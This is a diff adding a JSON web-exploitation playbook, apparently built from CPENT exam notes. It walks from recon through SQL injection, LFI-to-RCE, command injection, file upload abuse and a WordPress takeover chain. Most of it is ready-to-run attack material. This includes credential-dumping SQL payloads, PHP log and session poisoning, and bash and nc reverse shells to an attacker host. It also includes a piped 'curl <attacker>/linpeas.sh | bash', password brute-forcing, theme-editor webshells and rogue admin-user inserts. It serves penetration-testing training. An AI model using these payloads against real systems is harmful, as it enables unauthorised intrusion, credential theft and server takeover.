@@ -1,0 +1,281 @@
+{
+  "id": "web-argha-dey-methodology",
+  "zone": "web",
+  "name": "Argha Dey Web Exploitation Methodology",
+  "source": "Argha Dey CPENT Notes (94% scorer)",
+  "description": "Combined web-range playbook covering Recon \u2192 SQLi \u2192 LFI \u2192 CMDi \u2192 WordPress. Includes detection-to-RCE decision trees for LFI, manual exploitation workflow for CMDi (Read \u2192 Enumerate \u2192 Shell), and a 9-phase WordPress chain.",
+  "examHabits": [
+    "nmap's http-generator script output often reveals the exact WP version before running WPScan",
+    "Save the raw request from Burp and drive sqlmap with -r; don't hand-build -u/-data",
+    "Always run --batch in an exam/scripted context",
+    "Enumerate dbs \u2192 --tables \u2192 --columns \u2192 --dump in that order",
+    "Check every column of every dumped table - CPENT hides the real answer in unexpected columns",
+    "Note the exact -technique sqlmap reports (boolean/time/union/error)",
+    "If sqlmap fails, manually test with ' AND SLEEP(5) before assuming not injectable",
+    "Pivot immediately on any found DB credentials to SSH/other services"
+  ],
+  "quickRef": "nmap -sC -sV -T4 -Pn -A <ip> | feroxbuster -u http://<ip>/ -k -w common.txt | sqlmap -r request.txt -dbs --batch | wpscan --url http://<ip>/ -e vp,u,vt,cb,m --api-token <token>",
+  "steps": [
+    {
+      "phase": "Phase 1 - Recon & Fingerprinting",
+      "techniques": [
+        "passive-recon"
+      ],
+      "tools": [
+        "nmap",
+        "whatweb",
+        "ffuf",
+        "feroxbuster",
+        "httpx",
+        "wpscan"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "HTTP service identified",
+          "action": "nmap -p80,443 -sV --script http-title,http-server-header,http-generator; whatweb http://<ip>/",
+          "fallback": "Check for WordPress via readme.html or wp-login.php"
+        },
+        {
+          "condition": "WordPress confirmed (http-generator: WordPress x.x.x)",
+          "action": "Run full WPScan: wpscan --url http://<ip>/ -e vp,u,vt,cb,m -v --random-user-agent --disable-tls-checks --api-token <token>",
+          "fallback": "Proceed with generic web testing"
+        },
+        {
+          "condition": "Need directory discovery",
+          "action": "feroxbuster -u http://<ip>/ -k -w /usr/share/seclists/Discovery/Web-Content/common.txt (fast first pass) then big.txt",
+          "fallback": "ffuf -u http://<ip>/FUZZ -w seclists/big.txt -e .php for extension-aware fuzzing"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 2 - SQL Injection (Detection-to-Dump Workflow)",
+      "techniques": [
+        "sql-injection"
+      ],
+      "tools": [
+        "sqlmap",
+        "burp-suite",
+        "nmap",
+        "ffuf"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Input field suspected injectable",
+          "action": "Manually inject single quote (') \u2014 if verbose SQL error shows, backend is identified immediately",
+          "fallback": "Test ' OR '1'='1' -- - for auth bypass; ' OR SLEEP(5) -- - for time-based blind"
+        },
+        {
+          "condition": "Raw request captured in Burp",
+          "action": "Save as request.txt; sqlmap -r request.txt -dbs --batch",
+          "fallback": "sqlmap -r request.txt -D <database> --tables --batch"
+        },
+        {
+          "condition": "Table dumped, looking for pivot creds",
+          "action": "sqlmap -r request.txt -D <db> -T <table> --columns --batch; --dump only specific columns if needed",
+          "fallback": "UNION-based manual: ' UNION SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),NULL FROM users -- -"
+        },
+        {
+          "condition": "DB credentials found in unexpected column",
+          "action": "Pivot to SSH/other service with discovered creds (user_ssh1, user_auth columns)",
+          "fallback": "Look for security question answers for password-reset abuse"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 3 - LFI: Detection-to-RCE Decision Tree",
+      "techniques": [
+        "lfi-advanced"
+      ],
+      "tools": [
+        "curl",
+        "ffuf",
+        "liffy",
+        "burp-suite"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "?page= or similar parameter confirmed with /etc/passwd read",
+          "action": "Determine filter behavior: try ../, ....//, ..%2f, ..%252f, /etc/passwd (absolute), php://filter wrapper",
+          "fallback": "Blind LFI: time-based via huge file, or OOB callback"
+        },
+        {
+          "condition": "Can read Apache/Nginx access log",
+          "action": "Fastest path: curl http://<target>/ -A '<?php system($_GET[\"cmd\"]); ?>'; then ?page=.../access.log&cmd=id",
+          "fallback": "Try auth.log, vsftpd.log, mail spool"
+        },
+        {
+          "condition": "App stores user input server-side (search/profile/lang cookie)",
+          "action": "Poison PHP session file: curl search.php?q=<?php system($_GET['cmd']); ?> -b PHPSESSID=<id>; then ?page=.../sess_<id>&cmd=id",
+          "fallback": "Try /proc/self/environ poisoning via User-Agent header"
+        },
+        {
+          "condition": "App has ANY upload (images/PDF even if no .php)",
+          "action": "Upload shell.jpg with PHP code; include via LFI (include() executes PHP regardless of extension)",
+          "fallback": "php://filter/convert.base64-encode to read config.php for DB creds without RCE"
+        },
+        {
+          "condition": "allow_url_include=On (rare)",
+          "action": "RFI: host payload; ?page=http://<attacker>/shell.txt&cmd=id",
+          "fallback": "data:// wrapper: echo -n payload | base64; ?page=data://text/plain;base64,<b64>&cmd=id"
+        },
+        {
+          "condition": "No RCE path working",
+          "action": "Pure info disclosure: read config.php / wp-config.php via php://filter for DB creds \u2192 pivot via SQLi/SSH",
+          "fallback": "Fall back to commix or manual enumeration"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 4 - OS Command Injection (Read \u2192 Enumerate \u2192 Shell)",
+      "techniques": [
+        "cmdi-advanced"
+      ],
+      "tools": [
+        "curl",
+        "commix",
+        "burp-suite",
+        "ffuf"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Utility page found (ping.php, diag.php, nslookup.php, traceroute.php)",
+          "action": "Test separators: ; id, | id, $(id), `id`, &&, ||, %0a; URL-encode: %3B, %7C, %26",
+          "fallback": "Argument injection: --help, -oG output.txt"
+        },
+        {
+          "condition": "Output reflected (in-band)",
+          "action": "?ip=%7C+id; then enumerate: ?ip=|ls -la ../; ?ip=|cat ../filename.txt; ?ip=|sudo -l; ?ip=|find / -perm -4000 -type f",
+          "fallback": "If no output: test blind with sleep 5, or OOB via nslookup/curl to attacker"
+        },
+        {
+          "condition": "Space/filter blocked",
+          "action": "Use ${IFS}, %09 (tab), {cat,/etc/passwd}, or base64 obfuscation: $(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)",
+          "fallback": "Use commix --url=... --level=3 --tamper=space2comment,charencode"
+        },
+        {
+          "condition": "Command confirmed, need stable shell",
+          "action": "Reverse shell: bash -c 'bash -i >& /dev/tcp/<attacker>/4444 0>&1' or mkfifo named-pipe nc payload",
+          "fallback": "python3 -c 'import socket,subprocess,os;...' or php -r reverse shell"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 5 - WordPress: 9-Phase Chain (Fingerprint \u2192 RCE)",
+      "techniques": [
+        "wordpress-exploitation"
+      ],
+      "tools": [
+        "wpscan",
+        "nmap",
+        "curl",
+        "burp-suite",
+        "searchsploit",
+        "metasploit"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "New target",
+          "action": "Phase 1: nmap -sC -sV -p80,443 - look for http-generator: WordPress; curl readme.html for exact version",
+          "fallback": "Check /wp-login.php, /wp-admin/, /wp-content/plugins/"
+        },
+        {
+          "condition": "WP version confirmed",
+          "action": "Phase 2: wpscan --url http://<ip>/ -e vp,u,vt,cb,m -v --random-user-agent --api-token <token>",
+          "fallback": "Manual user enum: curl /?author=1 -I (grep location); curl /wp-json/wp/v2/users | jq"
+        },
+        {
+          "condition": "Valid username found",
+          "action": "Phase 4: wpscan --usernames users.txt --passwords rockyou.txt; OR hydra -l admin -P rockyou.txt <ip> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:Invalid'",
+          "fallback": "XML-RPC multicall: system.multicall tests many creds per request, evades simple rate-limiting"
+        },
+        {
+          "condition": "WPScan flags vulnerable plugin/theme",
+          "action": "Phase 5: searchsploit wordpress <plugin-name>; check installed version vs 'Fixed in' version; pull PoC, adapt IP/path",
+          "fallback": "nuclei -u http://<ip> -tags wordpress,wp-plugin,cve"
+        },
+        {
+          "condition": "wp-admin credentials obtained",
+          "action": "Phase 6: Theme Editor RCE (Appearance \u2192 Theme Editor \u2192 404 Template \u2192 paste php-reverse-shell.php \u2192 trigger via /index.php/nonexistent/)",
+          "fallback": "Malicious plugin ZIP: mkdir evil-plugin; zip upload; http://<ip>/wp-content/plugins/evil-plugin/evil-plugin.php?cmd=id"
+        },
+        {
+          "condition": "No wp-admin but DB access via SQLi/leaked config",
+          "action": "Phase 6.6: INSERT admin user into wp_users + wp_usermeta (wp_capabilities = administrator)",
+          "fallback": "Read wp-config.php via LFI php://filter for mysql -h <ip> -u wp_user -p to dump wp_users"
+        },
+        {
+          "condition": "Post-RCE on WordPress host",
+          "action": "Phase 9: cat /var/www/html/wp-config.php; mysql -e 'SELECT user_login,user_pass FROM wp_users;'; find / -perm -4000; sudo -l \u2192 proceed to standard Linux privesc",
+          "fallback": "Check for 777 scripts in cron jobs for instant root"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 6 - File Upload Abuse",
+      "techniques": [
+        "file-inclusion"
+      ],
+      "tools": [
+        "burp-suite",
+        "ffuf",
+        "commix",
+        "curl"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Upload feature with extension restriction (.pdf/.html/.image only)",
+          "action": "Read page source for client-side validation comments; craft PHP reverse shell, rename shell.php.pdf, intercept POST, rewrite filename= to shell.php",
+          "fallback": "Change Content-Type to application/octet-stream or flip hidden allow_all=0 \u2192 1"
+        },
+        {
+          "condition": "Upload directory discovered (/uploads/, /customerdocs/)",
+          "action": "rlwrap nc -lnvp 4444; curl http://<ip>/uploads/shell.php",
+          "fallback": "Check for double-extension bypass or null-byte tricks on older PHP"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 7 - Config & Backup File Leak Hunting",
+      "techniques": [
+        "lfi-advanced"
+      ],
+      "tools": [
+        "curl",
+        "wpscan",
+        "ffuf"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "WordPress target",
+          "action": "curl wp-config.php.bak, wp-config.php~, wp-config.php.save, wp-config.php.old, .wp-config.php.swp; wpscan -e cb (config backups) -e dbe (db exports)",
+          "fallback": "Check /wp-content/debug.log if WP_DEBUG_LOG enabled"
+        },
+        {
+          "condition": "General web app",
+          "action": "fuzz for: .env, config.php.bak, .git/, backup/*.zip, database.sql, shell.php.bak",
+          "fallback": "grep -R -i -E 'pass|secret|key|token' dumped_dir/ after .git extraction"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 8 - Post-Foothold & Shell Stabilization",
+      "techniques": [],
+      "tools": [
+        "linpeas",
+        "socat"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Webshell/reverse shell obtained",
+          "action": "Stabilize: python3 -c 'import pty; pty.spawn(\"/bin/bash\")'; Ctrl+Z; stty raw -echo; fg; export TERM=xterm",
+          "fallback": "socat file:tty,raw,echo=0 tcp-listen:4444 (attacker) + socat exec:bash -li... (victim)"
+        },
+        {
+          "condition": "Need local privesc",
+          "action": "curl http://<attacker>/linpeas.sh | bash; check sudo -l, SUID, cron, GTFOBins, world-writable files",
+          "fallback": "Manual: id; uname -a; /etc/passwd; env; ps aux; cat /etc/crontab"
+        }
+      ]
+    }
+  ]
+}
